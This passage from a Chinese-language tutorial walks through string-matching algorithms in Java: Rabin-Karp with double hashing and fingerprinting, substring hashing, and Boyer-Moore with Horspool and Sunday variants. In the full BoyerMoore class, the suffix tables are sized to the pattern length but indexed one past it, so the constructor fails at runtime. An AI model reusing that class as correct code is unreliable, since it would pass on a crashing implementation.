    private final static long <span class="hljs-attr">PRIME1</span> = <span class="hljs-number">1000000007</span><span class="hljs-comment">; // 第一个哈希的质数</span>
    private final static long <span class="hljs-attr">PRIME2</span> = <span class="hljs-number">1000000009</span><span class="hljs-comment">; // 第二个哈希的质数</span>
    
    // 使用双哈希来减少冲突
    public static int search(String text, String pattern) {
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        
        if (m &gt; n) return -1<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">m</span> == <span class="hljs-number">0</span>) return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        
        // 计算哈希乘数
        long <span class="hljs-attr">h1</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        long <span class="hljs-attr">h2</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; m - 1; i++) {</span>
            <span class="hljs-attr">h1</span> = (h1 * <span class="hljs-number">256</span>) % PRIME1<span class="hljs-comment">;</span>
            <span class="hljs-attr">h2</span> = (h2 * <span class="hljs-number">256</span>) % PRIME2<span class="hljs-comment">;</span>
        }
        
        // 计算模式串和第一个窗口的哈希值
        long <span class="hljs-attr">patternHash1</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        long <span class="hljs-attr">patternHash2</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        long <span class="hljs-attr">textHash1</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        long <span class="hljs-attr">textHash2</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; m; i++) {</span>
            <span class="hljs-attr">patternHash1</span> = (<span class="hljs-number">256</span> * patternHash1 + pattern.charAt(i)) % PRIME1<span class="hljs-comment">;</span>
            <span class="hljs-attr">patternHash2</span> = (<span class="hljs-number">256</span> * patternHash2 + pattern.charAt(i)) % PRIME2<span class="hljs-comment">;</span>
            <span class="hljs-attr">textHash1</span> = (<span class="hljs-number">256</span> * textHash1 + text.charAt(i)) % PRIME1<span class="hljs-comment">;</span>
            <span class="hljs-attr">textHash2</span> = (<span class="hljs-number">256</span> * textHash2 + text.charAt(i)) % PRIME2<span class="hljs-comment">;</span>
        }
        
        // 滑动窗口，比较哈希值
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= n - m; i++) {</span>
            // 两个哈希都相等时，再进行字符比较
            if (<span class="hljs-attr">patternHash1</span> == textHash1 &amp;&amp; patternHash2 == textHash2) {
                boolean <span class="hljs-attr">match</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
                for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; m; j++) {</span>
                    if (text.charAt(i + j) != pattern.charAt(j)) {
                        <span class="hljs-attr">match</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
                        break<span class="hljs-comment">;</span>
                    }
                }
                if (match) {
                    return i<span class="hljs-comment">; // 找到匹配</span>
                }
            }
            
            // 计算下一个窗口的哈希值
            if (i &lt; n - m) {
                <span class="hljs-attr">textHash1</span> = (<span class="hljs-number">256</span> * (textHash1 - text.charAt(i) * h1) + text.charAt(i + m)) % PRIME1<span class="hljs-comment">;</span>
                <span class="hljs-attr">textHash2</span> = (<span class="hljs-number">256</span> * (textHash2 - text.charAt(i) * h2) + text.charAt(i + m)) % PRIME2<span class="hljs-comment">;</span>
                
                // 处理负数哈希值
                if (textHash1 &lt; 0) textHash1 += PRIME1<span class="hljs-comment">;</span>
                if (textHash2 &lt; 0) textHash2 += PRIME2<span class="hljs-comment">;</span>
            }
        }
        
        return -1<span class="hljs-comment">; // 未找到匹配</span>
    }
}
</code></pre>
<h3 data-id="heading-4">优点</h3>
<ul>
<li>平均情况下时间复杂度为O(n+m)，接近线性时间</li>
<li>在多模式匹配场景下效率高</li>
<li>可以通过预处理模式串提高效率</li>
<li>滚动哈希计算使得算法高效移动窗口</li>
<li>实现相对简单，原理容易理解</li>
</ul>
<h3 data-id="heading-5">缺点</h3>
<ul>
<li>哈希冲突可能导致额外的字符比较</li>
<li>最坏情况下的时间复杂度为O(n*m)</li>
<li>哈希函数的选择对算法性能影响很大</li>
<li>需要注意数值溢出问题</li>
<li>对于短模式串和文本串，预处理开销可能抵消算法优势</li>
</ul>
<h3 data-id="heading-6">应用场景</h3>
<p>1）文档相似度检测和抄袭检测<br/>
2）网络安全中的特征码匹配<br/>
3）多模式字符串搜索引擎<br/>
4）编译器中的词法分析器</p>
<h3 data-id="heading-7">扩展：Rabin-Karp指纹算法</h3>
<p>Rabin-Karp算法的一个变种应用于文件相似度比较</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class RabinKarpFingerprint {
    private final static long <span class="hljs-attr">PRIME</span> = <span class="hljs-number">1000000007</span><span class="hljs-comment">;</span>
    private final static int <span class="hljs-attr">WINDOW_SIZE</span> = <span class="hljs-number">5</span><span class="hljs-comment">; // 指纹窗口大小</span>
    
    public static Set&lt;Long&gt; generateFingerprints(String text) {
        Set&lt;Long&gt; <span class="hljs-attr">fingerprints</span> = new HashSet&lt;&gt;()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        
        if (n &lt; WINDOW_SIZE) {
            fingerprints.add(calculateHash(text, n))<span class="hljs-comment">;</span>
            return fingerprints<span class="hljs-comment">;</span>
        }
        
        // 计算第一个窗口的哈希值
        long <span class="hljs-attr">textHash</span> = calculateHash(text, WINDOW_SIZE)<span class="hljs-comment">;</span>
        fingerprints.add(textHash)<span class="hljs-comment">;</span>
        
        // 计算哈希乘数
        long <span class="hljs-attr">h</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; WINDOW_SIZE - 1; i++) {</span>
            <span class="hljs-attr">h</span> = (h * <span class="hljs-number">256</span>) % PRIME<span class="hljs-comment">;</span>
        }
        
        // 滑动窗口，计算所有长度为WINDOW_SIZE的子串哈希值
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= n - WINDOW_SIZE - 1; i++) {</span>
            <span class="hljs-attr">textHash</span> = (<span class="hljs-number">256</span> * (textHash - text.charAt(i) * h) + text.charAt(i + WINDOW_SIZE)) % PRIME<span class="hljs-comment">;</span>
            if (textHash &lt; 0) {
                textHash += PRIME<span class="hljs-comment">;</span>
            }
            fingerprints.add(textHash)<span class="hljs-comment">;</span>
        }
        
        return fingerprints<span class="hljs-comment">;</span>
    }
    
    public static double calculateSimilarity(String text1, String text2) {
        Set&lt;Long&gt; <span class="hljs-attr">fingerprints1</span> = generateFingerprints(text1)<span class="hljs-comment">;</span>
        Set&lt;Long&gt; <span class="hljs-attr">fingerprints2</span> = generateFingerprints(text2)<span class="hljs-comment">;</span>
        
        // 计算交集大小
        Set&lt;Long&gt; <span class="hljs-attr">intersection</span> = new HashSet&lt;&gt;(fingerprints1)<span class="hljs-comment">;</span>
        intersection.retainAll(fingerprints2)<span class="hljs-comment">;</span>
        
        // 计算并集大小
        Set&lt;Long&gt; <span class="hljs-attr">union</span> = new HashSet&lt;&gt;(fingerprints1)<span class="hljs-comment">;</span>
        union.addAll(fingerprints2)<span class="hljs-comment">;</span>
        
        // 杰卡德相似度系数
        return (double) intersection.size() / union.size()<span class="hljs-comment">;</span>
    }
    
    private static long calculateHash(String str, int length) {
        long <span class="hljs-attr">hash</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; length; i++) {</span>
            <span class="hljs-attr">hash</span> = (<span class="hljs-number">256</span> * hash + str.charAt(i)) % PRIME<span class="hljs-comment">;</span>
        }
        return hash<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h3 data-id="heading-8">扩展：子字符串哈希</h3>
<p>一些编程竞赛里也使用Rabin-Karp思想进行高效的子字符串查询</p>
<p>java</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SubstringHash</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> PRIME = <span class="hljs-number">1000000007</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> BASE = <span class="hljs-number">256</span>;
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span>[] hash; <span class="hljs-comment">// 前缀哈希值</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span>[] pow;  <span class="hljs-comment">// BASE的幂</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> s;    <span class="hljs-comment">// 源字符串</span>
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">SubstringHash</span><span class="hljs-params">(<span class="hljs-type">String</span> s)</span> </span>{
        <span class="hljs-keyword">this</span>.s = s;
        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();
        hash = <span class="hljs-keyword">new</span> <span class="hljs-type">long</span>[n + <span class="hljs-number">1</span>];
        pow = <span class="hljs-keyword">new</span> <span class="hljs-type">long</span>[n + <span class="hljs-number">1</span>];
        
        <span class="hljs-comment">// 预计算BASE的幂</span>
        pow[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) {
            pow[i] = (pow[i - <span class="hljs-number">1</span>] * BASE) % PRIME;
        }
        
        <span class="hljs-comment">// 计算所有前缀的哈希值</span>
        hash[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {
            hash[i + <span class="hljs-number">1</span>] = (hash[i] * BASE + s.<span class="hljs-built_in">charAt</span>(i)) % PRIME;
        }
    }
    
    <span class="hljs-comment">// 计算子串s[l..r]的哈希值（0-indexed）</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title">substringHash</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> </span>{
        <span class="hljs-comment">// 获取s[0...r]的哈希值，减去s[0...l-1]的哈希值（需要进行适当调整）</span>
        <span class="hljs-type">long</span> result = (hash[r + <span class="hljs-number">1</span>] - (hash[l] * pow[r - l + <span class="hljs-number">1</span>]) % PRIME) % PRIME;
        <span class="hljs-keyword">if</span> (result &lt; <span class="hljs-number">0</span>) {
            result += PRIME;
        }
        <span class="hljs-keyword">return</span> result;
    }
    
    <span class="hljs-comment">// 检查两个子串是否相同</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title">areSubstringsEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> l1, <span class="hljs-type">int</span> r1, <span class="hljs-type">int</span> l2, <span class="hljs-type">int</span> r2)</span> </span>{
        <span class="hljs-keyword">if</span> (r1 - l1 != r2 - l2) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 长度不同</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">substringHash</span>(l1, r1) == <span class="hljs-built_in">substringHash</span>(l2, r2);
    }
}
</code></pre>
<h3 data-id="heading-9">相关的 LeetCode 热门题目</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Ffind-the-index-of-the-first-occurrence-in-a-string%2F" target="_blank" title="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/" ref="nofollow noopener noreferrer">28. 实现 strStr()</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Frepeated-dna-sequences%2F" target="_blank" title="https://leetcode.cn/problems/repeated-dna-sequences/" ref="nofollow noopener noreferrer">187. 重复的DNA序列</a> - 利用Rabin-Karp滚动哈希思想解决</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flongest-duplicate-substring%2F" target="_blank" title="https://leetcode.cn/problems/longest-duplicate-substring/" ref="nofollow noopener noreferrer">1044. 最长重复子串</a> - 结合二分查找和Rabin-Karp算法</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fstrings-differ-by-one-character%2F" target="_blank" title="https://leetcode.cn/problems/strings-differ-by-one-character/" ref="nofollow noopener noreferrer">1554. 只有一个不同字符的字符串</a></li>
</ul>
<p>Rabin-Karp算法巧妙结合哈希计算和滚动窗口技术，在字符串匹配领域提供了一种高效的解决方案，特别适合多模式匹配和大规模文本处理场景。</p>
<h2 data-id="heading-10">Boyer-Moore算法</h2>
<p>Boyer-Moore算法是一种高效的字符串匹配算法，由 Robert S. Boyer和J Strother Moore 设计于1977年。它<strong>从右向左比较</strong>字符，并利用两个启发式规则（坏字符规则和好后缀规则）在不匹配情况下实现较大跳跃，减少比较次数。Boyer-Moore算法在实际应用中大部分情况下<strong>比朴素算法和KMP算法更高效</strong>。</p>
<h3 data-id="heading-11">算法步骤</h3>
<ol>
<li>
<p>预处理模式串，构建坏字符表和好后缀表</p>
</li>
<li>
<p>将模式串对齐到文本串的开始位置</p>
</li>
<li>
<p>从模式串的最右侧字符开始比较，从右向左进行匹配</p>
</li>
<li>
<p>如果发生不匹配，通过以下规则计算跳转距离：</p>
<ul>
<li>坏字符规则：根据不匹配字符在模式串中的最右位置决定跳转距离</li>
<li>好后缀规则：根据已匹配部分在模式串中的重复情况决定跳转距离</li>
</ul>
</li>
<li>
<p>选择两个规则中的最大跳转距离，移动模式串</p>
</li>
<li>
<p>重复步骤3-5，直到找到匹配或到达文本串末尾</p>
</li>
</ol>
<p>核心特性：</p>
<ul>
<li><strong>从右向左比较</strong>：与大多数字符串匹配算法不同，从模式串的末尾开始比较</li>
<li><strong>双规则跳转</strong>：利用坏字符规则和好后缀规则计算跳转距离</li>
<li><strong>时间复杂度</strong>：最坏情况O(m*n)，m是模式串长度，n是文本串长度；平均情况接近O(n/m)</li>
<li><strong>空间复杂度</strong>：O(k+m)，其中k是字符集大小，m是模式串长度</li>
<li><strong>适用范围</strong>：特别适合长模式串和大字符集场景</li>
</ul>
<h3 data-id="heading-12">基础实现</h3>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class BoyerMoore {
    private final int R<span class="hljs-comment">; // 字符集大小</span>
    private int<span class="hljs-section">[]</span> badChar<span class="hljs-comment">; // 坏字符表</span>
    private int<span class="hljs-section">[]</span> goodSuffix<span class="hljs-comment">; // 好后缀表</span>
    private int<span class="hljs-section">[]</span> borderPos<span class="hljs-comment">; // 边界位置表</span>
    private String pattern<span class="hljs-comment">; // 模式串</span>
    
    public BoyerMoore(String pattern) {
        <span class="hljs-attr">this.R</span> = <span class="hljs-number">256</span><span class="hljs-comment">; // ASCII字符集</span>
        <span class="hljs-attr">this.pattern</span> = pattern<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        
        // 初始化坏字符表
        <span class="hljs-attr">badChar</span> = new int[R]<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">c</span> = <span class="hljs-number">0</span><span class="hljs-comment">; c &lt; R; c++) {</span>
            badChar<span class="hljs-section">[c]</span> = -1<span class="hljs-comment">; // 初始化为-1</span>
        }
        for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; m; j++) {</span>
            badChar<span class="hljs-section">[pattern.charAt(j)]</span> = j<span class="hljs-comment">; // 记录每个字符最右出现位置</span>
        }
        
        // 初始化好后缀表和边界位置表
        <span class="hljs-attr">goodSuffix</span> = new int[m]<span class="hljs-comment">;</span>
        <span class="hljs-attr">borderPos</span> = new int[m]<span class="hljs-comment">;</span>
        processSuffixes()<span class="hljs-comment">;</span>
    }
    
    // 预处理好后缀表
    private void processSuffixes() {
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">i</span> = m, j = m + <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        borderPos<span class="hljs-section">[i]</span> = j<span class="hljs-comment">;</span>
        
        // 计算边界位置
        while (i &gt; 0) {
            while (j &lt;= m &amp;&amp; pattern.charAt(i - 1) != pattern.charAt(j - 1)) {
                if (goodSuffix<span class="hljs-section">[j]</span> == 0) {
                    goodSuffix<span class="hljs-section">[j]</span> = j - i<span class="hljs-comment">;</span>
                }
                <span class="hljs-attr">j</span> = borderPos[j]<span class="hljs-comment">;</span>
            }
            i--<span class="hljs-comment">; j--;</span>
            borderPos<span class="hljs-section">[i]</span> = j<span class="hljs-comment">;</span>
        }
        
        // 计算好后缀表
        <span class="hljs-attr">j</span> = borderPos[<span class="hljs-number">0</span>]<span class="hljs-comment">;</span>
        for (<span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= m; i++) {</span>
            if (goodSuffix<span class="hljs-section">[i]</span> == 0) {
                goodSuffix<span class="hljs-section">[i]</span> = j<span class="hljs-comment">;</span>
            }
            if (<span class="hljs-attr">i</span> == j) {
                <span class="hljs-attr">j</span> = borderPos[j]<span class="hljs-comment">;</span>
            }
        }
    }
    
    // 搜索文本串中的匹配
    public int search(String text) {
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">m</span> == <span class="hljs-number">0</span>) return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        
        int skip<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= n - m; i += skip) {</span>
            <span class="hljs-attr">skip</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
            for (int <span class="hljs-attr">j</span> = m - <span class="hljs-number">1</span><span class="hljs-comment">; j &gt;= 0; j--) {</span>
                if (pattern.charAt(j) != text.charAt(i + j)) {
                    // 坏字符规则
                    <span class="hljs-attr">skip</span> = Math.max(<span class="hljs-number">1</span>, j - badChar[text.charAt(i + j)])<span class="hljs-comment">;</span>
                    // 好后缀规则
                    if (j &lt; m - 1) {
                        <span class="hljs-attr">skip</span> = Math.max(skip, goodSuffix[j + <span class="hljs-number">1</span>])<span class="hljs-comment">;</span>
                    }
                    break<span class="hljs-comment">;</span>
                }
            }
            if (<span class="hljs-attr">skip</span> == <span class="hljs-number">0</span>) return i<span class="hljs-comment">; // 找到匹配</span>
        }
        return -1<span class="hljs-comment">; // 没有找到匹配</span>
    }
    
    // 测试
    public static void main(String<span class="hljs-section">[]</span> args) {
        String <span class="hljs-attr">text</span> = <span class="hljs-string">"HERE IS A SIMPLE EXAMPLE"</span><span class="hljs-comment">;</span>
        String <span class="hljs-attr">pattern</span> = <span class="hljs-string">"EXAMPLE"</span><span class="hljs-comment">;</span>
        
        BoyerMoore <span class="hljs-attr">bm</span> = new BoyerMoore(pattern)<span class="hljs-comment">;</span>
        int <span class="hljs-attr">position</span> = bm.search(text)<span class="hljs-comment">;</span>
        
        if (<span class="hljs-attr">position</span> == -<span class="hljs-number">1</span>) {
            System.out.println("未找到匹配")<span class="hljs-comment">;</span>
        } else {
            System.out.println("模式串在位置 " + position + " 处匹配")<span class="hljs-comment">;</span>
            System.out.println(text)<span class="hljs-comment">;</span>
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; position; i++) {</span>
                System.out.print(" ")<span class="hljs-comment">;</span>
            }
            System.out.println(pattern)<span class="hljs-comment">;</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-13">优化策略</h3>
<h4 data-id="heading-14">简化好后缀表构建</h4>
<p>对于一些应用场景，可以只使用坏字符规则，简化算法实现</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class SimplifiedBoyerMoore {
    private final int R<span class="hljs-comment">; // 字符集大小</span>
    private int<span class="hljs-section">[]</span> badChar<span class="hljs-comment">; // 坏字符表</span>
    private String pattern<span class="hljs-comment">; // 模式串</span>
    
    public SimplifiedBoyerMoore(String pattern) {
        <span class="hljs-attr">this.R</span> = <span class="hljs-number">256</span><span class="hljs-comment">; // ASCII字符集</span>
        <span class="hljs-attr">this.pattern</span> = pattern<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        
        // 初始化坏字符表
        <span class="hljs-attr">badChar</span> = new int[R]<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">c</span> = <span class="hljs-number">0</span><span class="hljs-comment">; c &lt; R; c++) {</span>
            badChar<span class="hljs-section">[c]</span> = -1<span class="hljs-comment">; // 初始化为-1</span>
        }
        for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; m; j++) {</span>
            badChar<span class="hljs-section">[pattern.charAt(j)]</span> = j<span class="hljs-comment">; // 记录每个字符最右出现位置</span>
        }
    }
    
    // 搜索文本串中的匹配
    public int search(String text) {
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">m</span> == <span class="hljs-number">0</span>) return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        
        int skip<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= n - m; i += skip) {</span>
            <span class="hljs-attr">skip</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
            for (int <span class="hljs-attr">j</span> = m - <span class="hljs-number">1</span><span class="hljs-comment">; j &gt;= 0; j--) {</span>
                if (pattern.charAt(j) != text.charAt(i + j)) {
                    // 仅使用坏字符规则
                    <span class="hljs-attr">skip</span> = Math.max(<span class="hljs-number">1</span>, j - badChar[text.charAt(i + j)])<span class="hljs-comment">;</span>
                    break<span class="hljs-comment">;</span>
                }
            }
            if (<span class="hljs-attr">skip</span> == <span class="hljs-number">0</span>) return i<span class="hljs-comment">; // 找到匹配</span>
        }
        return -1<span class="hljs-comment">; // 没有找到匹配</span>
    }
}
</code></pre>
<h4 data-id="heading-15">缓存预计算结果</h4>
<p>针对需要重复搜索同一模式串的场景，可以预计算并缓存结果</p>
<p>java</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CachedBoyerMoore</span> {
    <span class="hljs-keyword">private</span> Map&lt;<span class="hljs-type">String</span>, BoyerMoore&gt; cache = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-type">String</span> text, <span class="hljs-type">String</span> pattern)</span> </span>{
        <span class="hljs-comment">// 检查缓存中是否有预计算的Boyer-Moore对象</span>
        BoyerMoore bm = cache.<span class="hljs-built_in">get</span>(pattern);
        <span class="hljs-keyword">if</span> (bm == null) {
            bm = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BoyerMoore</span>(pattern);
            cache.<span class="hljs-built_in">put</span>(pattern, bm);
        }
        
        <span class="hljs-keyword">return</span> bm.<span class="hljs-built_in">search</span>(text);
    }
}
</code></pre>
<h3 data-id="heading-16">优点</h3>
<ul>
<li>在实际应用中，大部分场景比KMP和朴素算法更高效</li>
<li>最好情况下可以跳过大量文本，实现亚线性时间复杂度</li>
<li>对于长模式串和大字符集特别有效</li>
<li>预处理跟模式串有关，与文本串长度无关</li>
</ul>
<h3 data-id="heading-17">缺点</h3>
<ul>
<li>预处理复杂，特别是好后缀表的构建</li>
<li>需要额外空间存储坏字符表和好后缀表</li>
<li>最坏情况下时间复杂度仍为O(m*n)</li>
<li>对于短模式串，预处理开销可能抵消算法优势</li>
<li>好后缀规则的实现较复杂，容易出错</li>
</ul>
<h3 data-id="heading-18">应用场景</h3>
<p>1）文本编辑器的查找功能<br/>
2）网络安全中的特征码匹配<br/>
3）自然语言处理中的关键词检索<br/>
4）大规模文本数据处理</p>
<h3 data-id="heading-19">扩展：Horspool算法</h3>
<p>Horspool算法是Boyer-Moore的简化版本，只使用坏字符规则，但是对坏字符表进行了修改</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class Horspool {
    private final int R<span class="hljs-comment">; // 字符集大小</span>
    private int<span class="hljs-section">[]</span> badChar<span class="hljs-comment">; // 坏字符表</span>
    private String pattern<span class="hljs-comment">; // 模式串</span>
    
    public Horspool(String pattern) {
        <span class="hljs-attr">this.R</span> = <span class="hljs-number">256</span><span class="hljs-comment">; // ASCII字符集</span>
        <span class="hljs-attr">this.pattern</span> = pattern<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        
        // 初始化坏字符表
        <span class="hljs-attr">badChar</span> = new int[R]<span class="hljs-comment">;</span>
        // 所有字符默认移动模式串长度
        for (int <span class="hljs-attr">c</span> = <span class="hljs-number">0</span><span class="hljs-comment">; c &lt; R; c++) {</span>
            badChar<span class="hljs-section">[c]</span> = m<span class="hljs-comment">;</span>
        }
        // 模式串中的字符（除了最后一个）设置为对应值
        for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; m - 1; j++) {</span>
            badChar<span class="hljs-section">[pattern.charAt(j)]</span> = m - 1 - j<span class="hljs-comment">;</span>
        }
    }
    
    // 搜索文本串中的匹配
    public int search(String text) {
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">m</span> == <span class="hljs-number">0</span>) return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        if (m &gt; n) return -1<span class="hljs-comment">;</span>
        
        int <span class="hljs-attr">i</span> = m - <span class="hljs-number">1</span><span class="hljs-comment">; // 从模式串最后一个字符对齐开始</span>
        while (i &lt; n) {
            int <span class="hljs-attr">k</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
            while (k &lt; m &amp;&amp; pattern.charAt(m - 1 - k) == text.charAt(i - k)) {
                k++<span class="hljs-comment">;</span>
            }
            
            if (<span class="hljs-attr">k</span> == m) {
                return i - m + 1<span class="hljs-comment">; // 找到匹配</span>
            }
            
            // 使用坏字符规则移动
            i += badChar<span class="hljs-section">[text.charAt(i)]</span><span class="hljs-comment">;</span>
        }
        
        return -1<span class="hljs-comment">; // 没有找到匹配</span>
    }
}
</code></pre>
<h3 data-id="heading-20">扩展：Sunday算法</h3>
<p>Sunday算法是另一种Boyer-Moore的变种，它关注的是文本串中模式串后面的字符</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class Sunday {
    private final int R<span class="hljs-comment">; // 字符集大小</span>
    private int<span class="hljs-section">[]</span> shift<span class="hljs-comment">; // 移动表</span>
    private String pattern<span class="hljs-comment">; // 模式串</span>
    
    public Sunday(String pattern) {
        <span class="hljs-attr">this.R</span> = <span class="hljs-number">256</span><span class="hljs-comment">; // ASCII字符集</span>
        <span class="hljs-attr">this.pattern</span> = pattern<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        
        // 初始化移动表
        <span class="hljs-attr">shift</span> = new int[R]<span class="hljs-comment">;</span>
        // 所有字符默认移动模式串长度+1
        for (int <span class="hljs-attr">c</span> = <span class="hljs-number">0</span><span class="hljs-comment">; c &lt; R; c++) {</span>
            shift<span class="hljs-section">[c]</span> = m + 1<span class="hljs-comment">;</span>
        }
        // 模式串中的字符设置为对应值
        for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; m; j++) {</span>
            shift<span class="hljs-section">[pattern.charAt(j)]</span> = m - j<span class="hljs-comment">;</span>
        }
    }
    
    // 搜索文本串中的匹配
    public int search(String text) {
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">m</span> == <span class="hljs-number">0</span>) return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        if (m &gt; n) return -1<span class="hljs-comment">;</span>
        
        int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; // 从文本串开始位置</span>
        while (i &lt;= n - m) {
            int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
            while (j &lt; m &amp;&amp; pattern.charAt(j) == text.charAt(i + j)) {
                j++<span class="hljs-comment">;</span>
            }
            
            if (<span class="hljs-attr">j</span> == m) {
                return i<span class="hljs-comment">; // 找到匹配</span>
            }
            
            // 下一个位置超出文本串长度，返回-1
            if (i + m &gt;= n) {
                return -1<span class="hljs-comment">;</span>
            }
            
            // 使用Sunday算法的移动规则
            i += shift<span class="hljs-section">[text.charAt(i + m)]</span><span class="hljs-comment">;</span>
        }
        
        return -1<span class="hljs-comment">; // 没有找到匹配</span>
    }
}
</code></pre>
<h3 data-id="heading-21">相关的 LeetCode 热门题目</h3>
<ul>
